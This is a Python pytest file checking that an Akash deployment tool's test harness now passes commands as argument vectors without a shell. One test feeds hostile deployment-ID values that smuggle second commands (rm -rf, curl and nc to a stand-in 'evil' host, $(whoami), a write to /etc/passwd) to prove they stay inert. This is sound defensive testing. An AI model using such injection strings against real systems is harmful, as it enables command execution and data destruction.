"""#282: the harness invokes commands as argument vectors, not through a shell.

⛔ WHY THIS FILE EXISTS AT ALL. The E2E it covers cannot be run here — it needs
`AKASH_API_KEY` from `secrets/ci.sops.env`, and SOPS will not decrypt off-CI — so
the conversion from `shell=True` to an argument vector is exactly the kind of
change whose correctness is normally only discovered in production. Three of the
eight call sites depended on SHELL QUOTING to pass a multi-word payload as one
argument, and a naive `shlex.split` conversion of those looks right, reads right,
passes review, and changes the command's meaning.

So the equivalence is asserted directly: every vector must equal `shlex.split` of
the exact string the shell used to receive. That turns "we think this is the same
command" into a checkable claim.

⚠ WHAT THAT CLAIM RESTS ON — READ THIS BEFORE EDITING ANY PAYLOAD BELOW.
`shlex.split` is NOT a general model of what a shell does. It agrees with `sh -c`
here because of two facts about these particular strings:

  1. The three risky payloads were SINGLE-QUOTED in the previous form
     (`exec 'cat {remote_path}'`), and single quotes suppress expansion — so there
     was nothing for the shell to do that `shlex.split` does not.
  2. `remote_path` is the literal `/tmp/e2e-test.env`. After interpolation these
     strings contain no variable, glob, or command substitution.

⛔ If either stops being true, THIS FILE KEEPS PASSING AND STOPS BEING EVIDENCE. A
payload that gains `$VAR`, a `*`, or double quotes makes the two diverge, and every
assertion here would go on comparing a vector against a `shlex.split` result that no
longer describes what the shell did. Plausible and false, which is worse than
absent — nothing would go red to tell you.

The property being relied on is "no shell expansion after interpolation", not
"shlex.split is what shells do". Re-derive it rather than trusting the green tick.
"""

from __future__ import annotations

import shlex

import pytest

from just_akash.test_shell_e2e import (
    _cmd_events,
    _cmd_exec,
    _cmd_inject,
    _cmd_logs,
    _cmd_status,
    run,
)

_DSEQ = "1788999000111"
_REMOTE = "/tmp/e2e-test.env"
_ENVFILE = "/tmp/local-env-file"

#: (built vector, the string this exact command was passed as under shell=True).
#: The right-hand sides are transcribed from the pre-#282 source, not re-derived.
_EQUIVALENCES = [
    pytest.param(
        _cmd_status(_DSEQ),
        f"uv run just-akash status --dseq {_DSEQ} --json",
        id="status",
    ),
    pytest.param(
        _cmd_logs(_DSEQ, tail=50, duration=10),
        f"uv run just-akash logs --dseq {_DSEQ} --tail 50 --duration 10",
        id="logs",
    ),
    pytest.param(
        _cmd_events(_DSEQ, duration=10),
        f"uv run just-akash events --dseq {_DSEQ} --duration 10",
        id="events",
    ),
    pytest.param(
        _cmd_exec("echo hello from lease-shell", _DSEQ),
        "uv run just-akash exec 'echo hello from lease-shell'"
        f" --dseq {_DSEQ} --transport lease-shell",
        id="exec-echo-QUOTED",
    ),
    pytest.param(
        _cmd_exec(f"cat {_REMOTE}", _DSEQ),
        f"uv run just-akash exec 'cat {_REMOTE}' --dseq {_DSEQ} --transport lease-shell",
        id="exec-cat-QUOTED",
    ),
    pytest.param(
        _cmd_exec(f"stat -c %a {_REMOTE}", _DSEQ),
        f"uv run just-akash exec 'stat -c %a {_REMOTE}' --dseq {_DSEQ} --transport lease-shell",
        id="exec-stat-QUOTED",
    ),
    pytest.param(
        _cmd_inject(_ENVFILE, _REMOTE, _DSEQ),
        f"uv run just-akash inject --env-file {_ENVFILE}"
        f" --remote-path {_REMOTE} --dseq {_DSEQ}"
        " --transport lease-shell",
        id="inject",
    ),
]


@pytest.mark.parametrize("argv, legacy", _EQUIVALENCES)
def test_the_vector_is_what_the_shell_would_have_produced(argv, legacy):
    """The conversion is verified against the old behaviour, not against intent."""
    assert argv == shlex.split(legacy), (
        "the argument vector differs from what `shell=True` passed for this command.\n"
        f"  built:  {argv}\n"
        f"  shell:  {shlex.split(legacy)}"
    )


@pytest.mark.parametrize(
    "payload",
    ["echo hello from lease-shell", f"cat {_REMOTE}", f"stat -c %a {_REMOTE}"],
)
def test_a_multi_word_exec_payload_stays_one_argument(payload):
    """⛔ THE ONE THING A NAIVE CONVERSION GETS WRONG.

    Under `shell=True` these were written `exec '<payload>'`, and the SHELL turned
    the quoted span into a single argv entry. Splitting it — by `shlex.split`, or by
    building the vector from a joined string — hands `just-akash exec` two or three
    arguments where it expects one. Nothing local would catch that: it is a valid
    vector, it runs, and it means something else.
    """
    argv = _cmd_exec(payload, _DSEQ)
    assert payload in argv, f"the payload was not passed intact: {argv}"
    assert argv[argv.index(payload) - 1] == "exec", (
        f"the payload is not the argument to `exec`: {argv}"
    )
    # ⛔ LENGTH, not fragment-absence. The first version of this asserted that no word
    # of the payload appears as its own element — which fires on CORRECT output,
    # because "echo hello from lease-shell" contains "lease-shell" and that is also
    # the legitimate value of --transport. A splitting bug shows up as extra elements,
    # so count them: 9 for an intact payload, 8 + len(payload.split()) if it split.
    assert len(argv) == 9, (
        f"expected 9 elements with the payload intact, got {len(argv)} — a payload of "
        f"{len(payload.split())} words that was split would give "
        f"{8 + len(payload.split())}: {argv}"
    )


@pytest.mark.parametrize(
    "hostile",
    [
        "1; rm -rf /tmp/pwned",
        "1 && curl http://evil/",
        "$(whoami)",
        "`id`",
        "1|nc evil 1234",
        "1 > /etc/passwd",
    ],
)
def test_a_hostile_dseq_becomes_one_inert_argument(hostile):
    """⛔ THE POINT OF THE CONVERSION, stated as a property rather than a diff.

    With a shell in the loop, a DSEQ carrying metacharacters was command syntax, and
    the only thing preventing that was the `(\\d+)` capture in a pattern hundreds of
    lines away. With a vector it is one argument, whatever it contains — the value
    can still be wrong, but it can no longer be *executed*.

    Asserted for the hostile string as a whole: it must appear as exactly one
    element, and none of its fragments may appear as elements of their own.
    """
    argv = _cmd_status(hostile)
    assert argv.count(hostile) == 1, f"the hostile value did not survive whole: {argv}"
    assert argv[argv.index(hostile) - 1] == "--dseq"
    for fragment in hostile.split():
        if fragment != hostile:
            assert fragment not in argv, (
                f"{fragment!r} became its own argument — the value was parsed as "
                f"syntax somewhere: {argv}"
            )


def test_run_passes_a_vector_and_no_shell():
    """The helper's contract, checked by running something real and harmless."""
    r = run(["printf", "%s", "ok"], timeout=30)
    assert r.returncode == 0 and r.stdout == "ok", (r.returncode, r.stdout, r.stderr)

    # ⛔ A shell would expand this; a vector must hand it over untouched.
    r = run(["printf", "%s", "$(id)"], timeout=30)
    assert r.stdout == "$(id)", (
        f"the argument was expanded before reaching the process: {r.stdout!r} — "
        "something is still going through a shell"
    )


def test_a_command_string_is_rejected_loudly_and_by_name():
    """⛔ `str` IS A `Sequence[str]` — the trap this conversion could have shipped.

    The obvious annotation for a vector, `Sequence[str]`, accepts a plain string,
    so a leftover call from the old API type-checks cleanly. `list("uv run ...")`
    is `['u','v',' ',...]`, and under `shell=False` the process tries to exec a
    program called `u`. Measured — the developer sees:

        FileNotFoundError: [Errno 2] No such file or directory: 'u'

    which says nothing about what went wrong. The annotation is `list[str]` now so
    pyright refuses a string, and this guard covers the case pyright will not see:
    a call site added later by someone who remembers the string API.

    ⚠ The first version of this test asserted only that *something* raised, and its
    docstring claimed subprocess "treats the WHOLE string as a single executable
    name". That is what happens without the `list()` call — with it, the string is
    split into characters. The test passed, for a reason that was not true.
    (Reported by Copilot on #293.)
    """
    with pytest.raises(TypeError) as excinfo:
        # ⛔ THE TYPE ERROR HERE IS THE GUARANTEE, not an oversight. pyright rejects
        # this line because `run` takes `list[str]` — which is the static half of the
        # fix. The ignore is what lets the RUNTIME half be tested at all.
        #
        # ⚠ If this ignore ever becomes "unused", the annotation has been widened back
        # to something that accepts `str` (e.g. `Sequence[str]`) and the static half is
        # gone. Do not delete the ignore; find out why it stopped being needed.
        run("uv run just-akash status --dseq 1 --json", timeout=10)  # type: ignore[arg-type]

    message = str(excinfo.value)
    assert "argument vector" in message, f"the rejection does not say what was wrong: {message!r}"
    assert "_cmd_" in message, (
        "the rejection does not point at the builders, so the reader is told what "
        f"not to do and not what to do: {message!r}"
    )
    # ⛔ It must fail BEFORE reaching subprocess. If it reaches exec, the failure is
    # FileNotFoundError('u') and the message above never appears.
    assert "No such file" not in message


def test_a_vector_is_still_accepted_after_that_guard():
    """The guard must reject strings without rejecting the ordinary case."""
    r = run(["printf", "%s", "vector-ok"], timeout=30)
    assert r.returncode == 0 and r.stdout == "vector-ok"
